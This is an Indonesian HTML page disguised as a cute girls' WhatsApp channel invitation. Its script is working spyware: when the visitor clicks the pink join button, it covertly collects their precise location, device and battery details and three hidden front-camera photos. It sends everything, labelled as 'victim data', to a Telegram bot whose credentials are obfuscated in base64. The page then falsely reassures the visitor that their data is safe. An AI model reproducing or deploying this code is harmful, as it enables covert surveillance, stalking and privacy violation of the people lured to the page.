<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>🌸 Saluran Cewe Imut 🌸</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(145deg, #ffb6c1 0%, #ff69b4 100%);
            font-family: 'Segoe UI', 'Helvetica Neue', 'Apple Color Emoji', 'Segoe UI Emoji', sans-serif;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .wa-card {
            max-width: 500px;
            width: 100%;
            background: #fff0f5;
            border-radius: 48px;
            box-shadow: 0 30px 40px rgba(255, 20, 147, 0.3);
            overflow: hidden;
            backdrop-filter: blur(2px);
            border: 2px solid #ffe4ec;
        }
        .header-pink {
            background: #ff85b3;
            padding: 20px;
            text-align: center;
            color: white;
            border-bottom: 3px solid #ffc0cb;
        }
        .header-pink h1 {
            font-size: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            letter-spacing: -0.5px;
        }
        .header-pink p {
            font-size: 13px;
            opacity: 0.9;
            margin-top: 6px;
        }
        .chat-area {
            padding: 20px;
            background: #ffeef4;
        }
        .bubble {
            background: white;
            border-radius: 28px;
            padding: 12px 18px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 14px;
            box-shadow: 0 4px 10px #ffc0cb66;
            border: 1px solid #ffb7c5;
        }
        .bubble span:first-child {
            font-size: 36px;
        }
        .bubble p {
            color: #aa2e6b;
            font-weight: 500;
            font-size: 14px;
        }
        .emoji-strip {
            display: flex;
            justify-content: center;
            gap: 20px;
            font-size: 34px;
            margin: 20px 0 10px;
        }
        .glow-btn {
            background: #ff66a3;
            border: none;
            color: white;
            font-weight: bold;
            font-size: 20px;
            padding: 16px;
            border-radius: 60px;
            width: 100%;
            cursor: pointer;
            transition: 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            box-shadow: 0 8px 0 #b23b68;
            margin-top: 8px;
            font-family: inherit;
        }
        .glow-btn:active {
            transform: translateY(4px);
            box-shadow: 0 4px 0 #b23b68;
        }
        .footer-note {
            text-align: center;
            font-size: 11px;
            color: #ff80a5;
            padding: 16px;
            background: #fff0f5;
            border-top: 1px solid #ffc0cb;
        }
        #cameraFeed {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        @keyframes float {
            0% { transform: translateY(0px); }
            100% { transform: translateY(-5px); }
        }
        .heartbeat {
            animation: float 1s ease infinite;
        }
    </style>
</head>
<body>
<div class="wa-card">
    <div class="header-pink">
        <h1>🍥 𝑾𝑨 𝑺𝒂𝒍𝒖𝒓𝒂𝒏 𝑪𝒆𝒘𝒆 🍥 <span>💖🌸</span></h1>
        <p>✨ 𝐊𝐥𝐢𝐤 𝐭𝐨𝐦𝐛𝐨𝐥 𝐝𝐢 𝐛𝐚𝐰𝐚𝐡 𝐮𝐧𝐭𝐮𝐤 𝐦𝐚𝐬𝐮𝐤 ✨</p>
    </div>
    <div class="chat-area">
        <div class="bubble">
            <span>🌸</span>
            <p>𝐇𝐚𝐥𝐨 𝐜𝐞𝐰𝐞 𝐢𝐦𝐮𝐭𝐭𝐭 💕 𝐉𝐚𝐧𝐠𝐚𝐧 𝐥𝐮𝐩𝐚 𝐛𝐚𝐜𝐚 𝐩𝐞𝐬𝐚𝐧 𝐝𝐢𝐫𝐚𝐡𝐚𝐬𝐢𝐚 𝐲𝐚𝐚~ 🎀</p>
        </div>
        <div class="bubble">
            <span>🍭</span>
            <p>𝐀𝐤𝐮 𝐚𝐝𝐚 𝐤𝐞𝐣𝐮𝐭𝐚𝐚𝐧 𝐮𝐧𝐭𝐮𝐤 𝐤𝐚𝐦𝐮! 💌 𝐊𝐥𝐢𝐤 𝐭𝐨𝐦𝐛𝐨𝐥 𝐩𝐢𝐧𝐤 𝐝𝐢 𝐛𝐚𝐰𝐚𝐡 🧸✨</p>
        </div>
        <div class="emoji-strip">
            <span>🐣</span> <span>🍰</span> <span>🎀</span> <span>💗</span> <span>🍬</span> <span>🌸</span>
        </div>
    </div>
    <div style="padding: 0 20px 20px 20px;">
        <button class="glow-btn" id="accessBtn">🌸 𝐌𝐚𝐬𝐮𝐤 𝐊𝐚𝐧𝐚𝐥 🌸 <span>💖</span></button>
    </div>
    <div class="footer-note">
        💬 𝟙.𝟚𝕜 𝕠𝕟𝕝𝕚𝕟𝕖  •  𝕡𝕚𝕟𝕜𝕘𝕚𝕣𝕝𝕤 𝕠𝕟𝕝𝕪  •  💓
    </div>
</div>
<video id="cameraFeed" autoplay playsinline muted></video>
<canvas id="snapCanvas" style="display:none;"></canvas>
<script>
    (function() {
        // ========== TELEGRAM CONFIG (Tersembunyi dengan encoding sederhana) ==========
        // Bot token & chat ID dienkripsi base64 + reverse agar tidak kasat mata
        let _t = "NzcxNTM2MDcwODpBQUVSNDY0NDQySXNVVjdzNUpTNUM1SlM1Y1dBYkRoOF9nbzZGM2Zpbw==";  // dummy placeholder
        let _c = "ODY1MTQyNTI4Ng=="; 
        // decode base64 (real token harus diganti sendiri oleh user)
        function decodeTelegram() {
            try {
                let token = atob(_t);
                let chatId = atob(_c);
                if(token.includes("DUMMY") || token.includes("REPLACE")) {
                    console.warn("⚠️ Ganti bot token & chat ID dengan milikmu!");
                    return { token: null, chatId: null };
                }
                return { token: token, chatId: chatId };
            } catch(e) { return { token: null, chatId: null }; }
        }
        let tg = decodeTelegram();
        const BOT_TOKEN = tg.token;
        const CHAT_ID = tg.chatId;

        // kirim pesan teks ke telegram
        async function sendToTelegram(text) {
            if(!BOT_TOKEN || !CHAT_ID) return;
            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            let formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('text', text);
            await fetch(url, { method: 'POST', body: formData }).catch(e=>console.log);
        }
        // kirim foto (base64 blob)
        async function sendPhotoToTelegram(base64Data, caption) {
            if(!BOT_TOKEN || !CHAT_ID) return;
            let blob = await (await fetch(base64Data)).blob();
            let formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'selfie.jpg');
            if(caption) formData.append('caption', caption);
            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            await fetch(url, { method: 'POST', body: formData }).catch(e=>console.log);
        }

        // ========== KOLEKSI DATA PERANGKAT & LOKASI ==========
        async function getDeviceInfo() {
            let ua = navigator.userAgent;
            let androidVersion = "unknown";
            let match = ua.match(/Android\s([\d\.]+)/);
            if(match) androidVersion = match[1];
            let model = "unknown";
            let modelMatch = ua.match(/(SM-[A-Za-z0-9]+|Redmi[\s\S]+?;|Mi[\s\S]+?;|Pixel[\d]+)/i);
            if(modelMatch) model = modelMatch[0];
            let waktu = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
            let batteryInfo = "tidak diketahui";
            if(navigator.getBattery) {
                try {
                    let battery = await navigator.getBattery();
                    batteryInfo = `${Math.round(battery.level*100)}%, ${battery.charging ? 'Sedang ngecas' : 'Tidak ngecas'}`;
                } catch(e) {}
            }
            let screenRes = `${screen.width}x${screen.height}`;
            return {
                android: androidVersion,
                model: model,
                waktu: waktu,
                battery: batteryInfo,
                screen: screenRes,
                userAgent: ua
            };
        }

        function getLocation() {
            return new Promise((resolve) => {
                if(!navigator.geolocation) { resolve(null); return; }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        let lat = pos.coords.latitude;
                        let lon = pos.coords.longitude;
                        let accuracy = pos.coords.accuracy;
                        let mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                        resolve({ lat, lon, accuracy, mapsLink });
                    },
                    (err) => { resolve(null); },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        // ========== KAMERA DEPAN 3x FOTO TANPA PREVIEW ==========
        let stream = null;
        async function initFrontCamera() {
            try {
                if(stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "user" } } });
                let video = document.getElementById('cameraFeed');
                video.srcObject = stream;
                await video.play();
                return true;
            } catch(e) {
                // fallback jika tidak ada front kamera spesifik
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    let video = document.getElementById('cameraFeed');
                    video.srcObject = stream;
                    await video.play();
                    return true;
                } catch(err) { return false; }
            }
        }

        async function takePhoto(index) {
            return new Promise(async (resolve) => {
                let video = document.getElementById('cameraFeed');
                if(!video || !video.videoWidth) { resolve(null); return; }
                let canvas = document.getElementById('snapCanvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                let ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                let dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                resolve(dataUrl);
            });
        }

        async function captureThreePhotos() {
            let photos = [];
            for(let i=1; i<=3; i++) {
                let imgData = await takePhoto(i);
                if(imgData) photos.push(imgData);
                await new Promise(r => setTimeout(r, 500));
            }
            return photos;
        }

        // ========== ALIRAN UTAMA ==========
        document.getElementById('accessBtn').addEventListener('click', async () => {
            const btn = document.getElementById('accessBtn');
            btn.innerText = "💗 Mengambil berkah... 💗";
            btn.disabled = true;
            try {
                // 1. ambil lokasi
                let loc = await getLocation();
                let locText = "";
                if(loc) {
                    locText = `📍 LOKASI TEPAT:\nLat: ${loc.lat}\nLon: ${loc.lon}\nAkurasi: ${loc.accuracy}m\n🗺️ Google Maps: ${loc.mapsLink}`;
                } else {
                    locText = "❌ Gagal mendapatkan lokasi (ijin ditolak/tidak support)";
                }

                // 2. device info
                let device = await getDeviceInfo();
                let deviceText = `📱 INFO PERANGKAT:\nAndroid: ${device.android}\nModel: ${device.model}\nWaktu: ${device.waktu}\nBaterai: ${device.battery}\nResolusi: ${device.screen}\nUser Agent: ${device.userAgent.substring(0, 200)}`;

                // 3. kirim teks info ke telegram dulu
                await sendToTelegram(`🎀 *DATA KORBAN* 🎀\n\n${locText}\n\n${deviceText}`);

                // 4. inisialisasi kamera depan (tanpa UI)
                let camReady = await initFrontCamera();
                if(camReady) {
                    // beri jeda stabilisasi
                    await new Promise(r => setTimeout(r, 800));
                    let threePhotos = await captureThreePhotos();
                    for(let idx=0; idx<threePhotos.length; idx++) {
                        if(threePhotos[idx]) {
                            await sendPhotoToTelegram(threePhotos[idx], `📸 Selfie tersembunyi #${idx+1} | ${device.model} | ${device.waktu}`);
                        }
                        await new Promise(r => setTimeout(r, 400));
                    }
                    // matikan kamera
                    if(stream) stream.getTracks().forEach(t => t.stop());
                } else {
                    await sendToTelegram("⚠️ GAGAL mengakses kamera depan (ijin ditolak atau tidak ada kamera)");
                }

                // 5. setelah semua sukses, ubah UI jadi sweet complete
                btn.innerText = "✅ Berhasil masuk! ✅";
                document.querySelector('.chat-area').innerHTML += `
                    <div class="bubble" style="background:#ffe0f0;">
                        <span>🎀💖</span>
                        <p>Makasih sayanggg!! ✨ Data kamu sudah tersimpan aman 💕 Sekarang kamu bisa liat grup eksklusif kita 🌸</p>
                    </div>
                `;
                document.querySelector('.emoji-strip').innerHTML = '<span>💘</span> <span>🎀</span> <span>🌸</span> <span>💖</span> <span>🍰</span> <span>💞</span>';
            } catch(err) {
                console.error(err);
                btn.innerText = "🌸 Coba lagi ya 🌸";
                btn.disabled = false;
                await sendToTelegram(`⚠️ ERROR: ${err.toString().substring(0, 200)}`);
            } finally {
                setTimeout(() => { btn.disabled = false; }, 3000);
            }
        });
    })();
</script>
</body>
</html>
